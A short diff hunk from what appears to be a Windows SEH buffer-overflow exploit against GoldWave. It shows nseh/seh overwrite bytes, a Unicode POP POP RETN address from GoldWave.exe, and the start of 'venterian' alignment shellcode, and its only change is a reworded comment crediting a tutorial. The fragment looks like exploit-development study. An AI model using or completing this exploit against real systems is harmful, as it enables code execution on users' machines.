@@ -10,7 +10,8 @@ from struct import pack
 nseh = "\x61\x62"
 seh = "\x0f\x6d" # Unicode POP POP RETN from GoldWave.exe 
 
-# stole the venterian alignment from https://nutcrackerssecurity.github.io/Windows5.html because i'm still learning to write this manually
+# took the venterian alignment from https://nutcrackerssecurity.github.io/Windows5.html 
+# because i'm still learning to write this manually
 venterian_alignment = (
 "\x53" 					#push ebx
 "\x47" 					#align
